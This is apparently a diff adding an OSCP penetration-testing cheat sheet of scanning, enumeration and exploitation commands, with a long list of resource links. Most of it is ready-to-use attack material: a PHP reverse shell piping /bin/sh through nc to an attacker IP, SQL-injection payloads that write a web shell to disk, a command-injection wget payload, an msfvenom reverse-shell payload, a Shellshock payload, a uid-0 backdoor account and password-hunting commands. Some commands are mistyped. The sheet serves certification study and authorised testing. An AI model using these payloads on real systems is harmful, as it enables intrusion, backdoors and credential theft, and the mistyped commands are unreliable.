@@ -1,0 +1,276 @@
+# OSCP cheat sheet by Prashant Ghatani
+
+# Scanning and enumeration
+
+## Port Scanning
+
+- namp -sC -sV -O- -p- <ip>
+- nmap -sV -sC -sU <ip>
+- nmap -Pn -sT -sU -p $ports —script="vuln" -vv -oN nmap_vuln <ip>
+
+## FTP- Port 21
+
+- nmap -p 21 —script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN ftp $ip
+- hydra -s 21 -C /usr/share/sparta/wordlis/ftp-default-userpass.txt -u -f $ip ftp
+
+If anonymous login is allowed, enumerate the ftp directory and check for upload functionality
+
+## SNMP- Port 161
+
+- snmpwalk -c public -v1 $ip
+- snmp-check $ip
+- snmpcheck -t $ip -c public
+- Onesixtyone -c <community list file> -I <ip-address>
+
+## Web- Port 80,443
+
+- nikto -h <ip>
+- curl -X OPTIONS <ip>
+- curl -s http://$ip/robots.txt
+- gobuster dir -u <ip> -w <wordlist>
+- dirsearch -u <ip> -w <wordlist> -e <extension>
+
+Check for LFI/RFI, SQLi in URL & POST request parameters & File Uploads 
+
+## MySQL - Port 3306 & MsSQL - Port 1433
+
+- nmap -p 3306 —script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN mysql $ip
+
+## SMB - Port 445,139 & RPC - Port 111, 135
+
+- enum4linux -a <ip>
+- nmap -p 139,445 192.168.1.1/24 —scropt smb-enum-shares.nse smb-os-discovery.nse
+- nmap —script [rpcinfo.](http://rpcinfo.se)nse <targetip> -p 111
+- rpcclient -U "" -N
+- smbclien -L <ip>
+- showmount -e $ip
+- smbmap -H [ip] -d [domain] -u [user] -p [password]
+- mount -t cifs //<server ip>/<share> <local dir> -o username="guest",password=""
+
+# Spawning a shell
+
+- python -c 'import pty;pty.spawn("/bin/bash")'
+- <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2> &1 | nc <attackerip> 1234 >/tmp/f');?>
+
+## Shell From SQL Injection
+
+Windows:
+
+- ?id=1union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+
+Linux:
+
+- ?id=1 union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6,7,8,9 into OUTFILE '/var/www/html/cmd.php""
+
+- echo 'os.system('/bin/bash')'
+
+## Post Exploitation
+
+- python -m SimpleHTTPServer 80 → On attacker
+- on victim download using wget
+
+- nc -lvnp > file(on attacker) | nc <attacker_ip> 4444 > file
+- unshadow passwd.txt shadow.txt > passwords.txt
+- sudo useradd -ou 0 -g 0 john | sudo passwd John@1234
+
+## Packet Inspection
+
+- tcpdump tcp port 80 -w out.pacp -i eth0
+
+## Command Injection
+
+- [url.com/filr.php[?path=/]](http://url.com/filr.php[?path=/])
+- ?path=/; wget http://<your_ip>:<port>/<file to be transferred>.<extension>;
+
+## Add Shellcode
+
+- msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
+
+## Application Mapping
+
+- whatweb <ip address>
+
+## File Uploads
+
+- if you are unable to upload shell using .php; try pHp , php3 , php5
+
+## SSH Shellshock
+
+- ssh -i user (ssh key) user@<ip> '() {:;}; /bin/bash'
+
+## Generating custom wordlists
+
+- cewl -m 3 (minimun letter words) -w <output file name>
+
+## DNS ZoneTransfer
+
+- dnsrecon -d Target -D /usr/share/wordlist/dnsmap.txt -t std —xml output.xml
+
+## Cracking Hashes
+
+- john —rules —wordlist=/usr/share/wordlist/rockyou.txt
+
+unshadowed.txt
+
+## Search for Passwords
+
+- dir /s *password*
+- findstr /si password *.ini *.xml *.txt
+- findstr /spin "password" *.*
+
+## Directory Traversal for Web
+
+- dotdotpwn -m http -h <host-ip> -o windows
+
+## Tunneling
+
+- sshuttle -r root@10.0.0.1.10.10.10.0/24
+
+## NoSQL Databases
+
+Postgresql → Port 5432/tcp 
+
+Default Credentials: postgres:postgres 
+
+nmap -sV <ip> -p 5432
+
+Mongo DB → Port 27017/tcp 
+
+nmap -p 27017 --script mongodb-info <ip>
+
+Oracle NoSQL → Port 5000/tcp 
+
+Redis → Port 6379/tcp 
+
+Default Credentials - no password
+
+## NFS File Share
+
+NFS File Share → Port 111, 2049
+
+showmount -e <ip>
+
+mount <ip>:/vol/share /mnt/nfs -nolock
+
+## VNC
+
+VNC → Port 5900/tcp
+
+vncviewer <ip_address:port> 
+
+nmap -p 5900 --script vnc-info <ip_address>
+
+Metasploit Auxiliary - use auxiliary/scanner/vnc/vnc_login 
+
+vncviewer <ip:port> 
+
+## Misclanious
+
+Cheat Sheets
+
+Penetration Tools Cheat Sheet
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
+
+Pen Testing Bookmarks
+https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md
+
+OSCP Cheatsheets
+https://github.com/slyth11907/Cheatsheets
+
+CEH Cheatsheet
+[https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking - CEH Cheat Sheet Exercises.pdf](https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20CEH%20Cheat%20Sheet%20Exercises.pdf)
+
+Net Bios Scan Cheat Sheet
+https://highon.coffee/blog/nbtscan-cheat-sheet/
+
+Reverse Shell Cheat Sheet
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+NMap Cheat Sheet
+https://highon.coffee/blog/nmap-cheat-sheet/
+
+Linux Commands Cheat Sheet
+https://highon.coffee/blog/linux-commands-cheat-sheet/
+
+Security Hardening CentO 7
+https://highon.coffee/blog/security-harden-centos-7/
+
+MetaSploit Cheatsheet
+https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+
+Google Hacking Database:
+https://www.exploit-db.com/google-hacking-database/
+
+Windows Assembly Language Mega Primer
+http://www.securitytube.net/groups?operation=view&groupId=6
+
+Linux Assembly Language Mega Primer
+http://www.securitytube.net/groups?operation=view&groupId=5
+
+Metasploit Cheat Sheet
+https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+
+A bit dated but most is still relevant
+
+http://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html
+
+NetCat
+
+http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf
+
+http://www.secguru.com/files/cheatsheet/nessusNMAPcheatSheet.pdf
+
+http://sbdtools.googlecode.com/files/hping3_cheatsheet_v1.0-ENG.pdf
+
+[http://sbdtools.googlecode.com/files/Nmap5 cheatsheet eng v1.pdf](http://sbdtools.googlecode.com/files/Nmap5%20cheatsheet%20eng%20v1.pdf)
+
+http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
+
+[http://rmccurdy.com/scripts/Metasploit meterpreter cheat sheet reference.html](http://rmccurdy.com/scripts/Metasploit%20meterpreter%20cheat%20sheet%20reference.html)
+
+http://h.ackack.net/cheat-sheets/netcat
+
+## Essentials
+
+Exploit-db
+https://www.exploit-db.com/
+
+SecurityFocus - Vulnerability database
+http://www.securityfocus.com/
+
+Vuln Hub - Vulnerable by design
+https://www.vulnhub.com/
+
+Exploit Exercises
+https://exploit-exercises.com/
+
+SecLists - collection of multiple types of lists used during security assessments. List types include usernames, passwords, URLs, sensitive data grep strings, fuzzing payloads
+https://github.com/danielmiessler/SecLists
+
+Security Tube
+http://www.securitytube.net/
+
+Metasploit Unleashed - free course on how to use Metasploit
+https://www.offensive-security.com/metasploit-unleashed/
+
+0Day Security Enumeration Guide http://www.0daysecurity.com/penetration-testing/enumeration.html
+
+Github IO Book - Pen Testing Methodology
+https://monkeysm8.gitbooks.io/pentesting-methodology/
+
+Windows Privledge Escalation
+Fuzzy Security http://www.fuzzysecurity.com/tutorials/16.html
+
+accesschk.exe https://technet.microsoft.com/en-us/sysinternals/bb664922
+
+Windows Priv Escalation For Pen Testers https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+
+Elevating Privileges to Admin and Further https://hackmag.com/security/elevating-privileges-to-administrative-and-further/
+
+Transfer files to windows machines https://blog.netspi.com/15-ways-to-download-a-file/
+
+Windows-Privesc/windows privesc sectalks BNE0x19.pdf [https://github.com/codingo/Windows-Privesc/blob/master/windows privesc sectalks BNE0x19.pdf](https://github.com/codingo/Windows-Privesc/blob/master/windows%20privesc%20sectalks%20BNE0x19.pdf)
+
+https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE/tree/master/7-part-100-article
+
+https://github.com/joker2a/OSCP
